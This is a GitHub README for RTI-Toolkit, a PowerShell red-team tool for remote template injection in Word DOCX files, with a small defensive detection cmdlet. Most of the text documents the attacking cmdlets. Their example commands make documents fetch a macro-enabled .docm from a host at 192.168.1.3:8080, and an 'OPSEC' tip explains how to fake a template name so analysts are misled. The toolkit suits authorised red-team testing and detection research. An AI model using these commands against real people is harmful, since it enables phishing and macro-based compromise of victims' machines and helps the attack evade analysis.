# RTI-Toolkit

Remote Template Injection Toolkit

<p align="center">
  <img width="500" height="500" src="https://github.com/nickvourd/RTI-Toolkit/blob/main/Pictures/injection-Logo.png">
</p>

## Description

RTI-Toolkit is an open-source PowerShell toolkit for Remote Template Injection attack. This toolkit includes a PowerShell script named `PS-Templator.ps1` which can be used from both an attacking and defensive perspective.

The following tables presents the main modules (cmdlets) of `PS-Templator.ps1`:

| Cmdlet | Description | Prespective |
| -------|:-----------:|:-----------:|
| [Invoke-Template](#invoke-template) | Implements remote template links within default Office Word templates  | attacking |
| [Invoke-Regular](#invoke-regular) | Implements remote template links within regular Office Word documents without template | attacking |
| [Invoke-Identify](#invoke-identify) | Indentifies remote template links within Office Word docx documents with/without template | defensive |
| Invoke-Type | | Misc |

⚠️ `PS-Templator.ps1` supports only DOCX files.

## Version

### 1.0.0

## License

This tool is licensed under the [![License: MIT](https://img.shields.io/badge/MIT-License-yellow.svg)](LICENSE).

## Table of Contents
- [RTI-Toolkit](#rti-toolkit)
  - [Description](#description)
  - [Version](#version)
  - [License](#license)
  - [Table of Contents](#table-of-contents)
  - [Remote Template Injection (RTI)](#remote-template-injection-rti)
  - [Installation](#installation)
  - [Cmdlets](#cmdlets)
    - [Invoke-Template](#invoke-template)
      - [Invoke-Template Example](#invoke-template-example)
    - [Invoke-Regular](#invoke-regular)
      - [Invoke-Regular Example](#invoke-regular-example)
      - [Invoke-Regular Example 2](#invoke-regular-example-2)
    - [Invoke-Identify](#invoke-identify)
      - [Invoke-Identify Example](#invoke-identify-example)
      - [Invoke-Identify Example 2](#invoke-identify-example-2)
  - [References](#references)

## Remote Template Injection (RTI)

Remote Template Injection (RTI) in the context of Microsoft Office refers to a specific type of security vulnerability that can be exploited through malicious templates in Office documents (e.g., Word, Excel, PowerPoint).

For example, in a DOCX file, the content is stored in XML format within the archive, and some of these XML files may reference external resources or templates. Attackers can indeed manipulate these XML files to insert malicious links or content that can potentially exploit vulnerabilities or deceive users. 

This is a Macro-Based attack.

## Installation

To load `PS-Templator.ps1` as a module into memory, run the following command:
```
Import-Module .\PS-Templator.ps1
```

:information_source: `PS-Templator.ps1` works without the necessity of installing any additional dependencies.<br /><br />
:information_source: `PS-Templator.ps1` works as PowerShell module.

## Cmdlets

### Invoke-Template

`Invoke-Template` is a cmdlet that implements remote template links within default Office Word templates.

#### Invoke-Template Example

Assuming that you have a default Word template, one like them:

![All Words Templates](/Pictures/All-Word-Templates.png)

Saved as, for example, 'Name.docx':

![Default Word Template Document](/Pictures/Default-Word-Template.png)

If you use `Invoke-Template` cmdlet you can insert a malicious link within this docx:

```
Invoke-Template -InputDoc Name.docx -Link "https://192.168.1.3:8080/Doc1.docm" -Output C:\Users\User\Desktop\LegitDocument.docx
```

Outcome:

![Invoke-Template-1](/Pictures/Invoke-Template-1.png)

As you can see, the Invoke-Template module keeps a backup of the original document and provides the full path to the malicious document.

From debugging prespective, if you connvert the malicious docx to zip archive and go into /word/_rels/settings.xml.rels, you can see the malicious link:

![Invoke-Template-Debug](/Pictures/Invoke-Template-Debug.png)

### Invoke-Regular

`Invoke-Regular` is a cmdlet that implements remote template links within default Office Word documents without templates.

#### Invoke-Regular Example

Assuming that you have a default Word document without a template, like this:

![Blank Document](/Pictures/Blank-Document.png)

Saved as, for example, 'Doc1.docx':

![Word Document](/Pictures/Word-Document.png)

If you use `Invoke-Regular` cmdlet you can insert a malicious link within this docx:

```
Invoke-Regular -InputDoc C:\Users\User\Desktop\Doc1.docx -Link "http://192.168.1.3:8080/Doc1.docm" -Output Nikos2.docx
```

Outcome:

![Invoke-Regular-1](/Pictures/Invoke-Regular-1.png)

As you can see, the Invoke-Regular module keeps a backup of the original document and provides the full path to the malicious document.

From debugging prespective, if you connvert the malicious docx to zip archive and go into /word/_rels/settings.xml.rels, you can see the malicious link:

![Invoke-Regular-Debug-1](/Pictures/Invoke-Regular-Debug-1.png)

#### Invoke-Regular Example 2

From an OPSEC perspective, you can use `-TemplateName` in conjunction with the `Invoke-Regular` module. This will make your malicious document appear more legitimate if someone try to analyze it.

Here is an example:

```
Invoke-Regular -InputDoc C:\Users\User\Desktop\Doc1.docx -Link "http://192.168.1.3:8080/Doc1.docm" -Output Legittemplate.dotx
```

Outcome:

![Invoke-Regular-Example-2](/Pictures/Invoke-Regular-Example2.png)

From debugging prespective, if you connvert the malicious docx to zip archive and go into /docProps/app.xml, you can see the fake template name:

![Invoke-Regular-Fake-Template-Name](/Pictures/Invoke-Regular-Fake-Template-Name.png)

### Invoke-Identify

`Invoke-identify` is a cmdlet that indentifies remote template links within Office Word docx documents with/without template.

#### Invoke-Identify Example

Assuming that you have a malicious Word document:

```
Invoke-Identify -InputDoc LegitDocument.docx -Output C:\Users\User\Desktop\output.txt
```

Outcome:

![Invoke-Identify Malicous Example](/Pictures/Invoke-Identify-Malicious-Example.png)

#### Invoke-Identify Example 2

Assuming that you have a non-malicious Word document:

```
Invoke-Identify -InputDoc Name.docx -Output C:\Users\User\Desktop\output2.txt
```

Outcome:

![Invoke-Identify Clean Example](/Pictures/Invoke-Identify-Clean-Example.png)

## References
- [ired.team](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros)
- [dmcxblue.gitbook.io](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t1221-template-injection)
- [john-woodman.com](https://john-woodman.com/research/vba-macro-remote-template-injection/)
- [remoteInjector GitHub John Woodman](https://github.com/JohnWoodman/remoteInjector)
- [Invoke-Templator GitHub Outflanknl](https://github.com/outflanknl/Invoke-Templator)
- [attack.mitre.org](https://attack.mitre.org/techniques/T1221/)